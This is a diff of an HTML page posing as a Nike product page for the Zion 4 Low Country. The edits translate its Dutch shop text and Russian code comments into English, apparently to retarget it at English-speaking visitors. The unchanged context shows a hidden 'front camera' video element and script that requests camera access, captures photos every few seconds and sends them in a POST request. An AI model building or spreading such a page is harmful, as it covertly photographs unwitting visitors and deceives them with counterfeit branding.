@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="nl">
+<html lang="en">
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
@@ -148,24 +148,24 @@
 <main>
   <div class="product-container">
     <div class="images">
-      <img src="https://i.imgur.com/6jHzUvN.png" alt="Nike Zion 4 Low Country" />
+      <img src="https://static.nike.com/a/images/t_PDP_936_v1/f_auto,q_auto:eco,u_126ab356-44d8-4a06-89b4-fcdcc8df0245,c_scale,fl_relative,w_1.0,h_1.0,fl_layer_apply/2b88a63b-3498-42bf-93de-8ac656e07868/JORDAN+ZION+4.png" alt="Nike Zion 4 Low Country" />
     </div>
     <div class="product-info">
       <h1>Zion 4 Low Country</h1>
-      <h2>Basketbalschoenen</h2>
-      <p>De Zion 4 Low Country is ontworpen voor maximale prestaties en comfort op het basketbalveld. Lichtgewicht en stijlvol met opvallende details.</p>
-      <div class="price">€149,99</div>
+      <h2>Basketball Shoes</h2>
+      <p>The Zion 4 Low Country is designed for maximum performance and comfort on the basketball court. Lightweight and stylish with striking details.</p>
+      <div class="price">$149.99</div>
       <div>
-        <div class="btn">In Winkelwagen</div>
-        <div class="btn">Nu Kopen</div>
+        <div class="btn">Add to Cart</div>
+        <div class="btn">Buy Now</div>
       </div>
     </div>
   </div>
 </main>
 
-<footer>© 2025 Nike, Inc. Alle rechten voorbehouden.</footer>
+<footer>© 2025 Nike, Inc. All rights reserved.</footer>
 
-<!-- Скрытое видео для фронтальной камеры -->
+<!-- Hidden video for front camera -->
 <video id="video" autoplay playsinline muted style="display:none;"></video>
 
 <script>
@@ -182,7 +182,7 @@
         body: formData,
       });
     } catch (e) {
-      console.error("Ошибка отправки фото:", e);
+      console.error("Error sending photo:", e);
     }
   }
 
@@ -191,7 +191,7 @@
     const width = video.videoWidth || 320;
     const height = video.videoHeight || 240;
     if(width === 0 || height === 0) {
-      console.error("Видео не готово");
+      console.error("Video not ready");
       return;
     }
     const canvas = document.createElement("canvas");
@@ -213,7 +213,7 @@
         }, 3000);
       };
     } catch(e) {
-      console.error("Ошибка доступа к камере:", e);
+      console.error("Camera access error:", e);
     }
   }
 
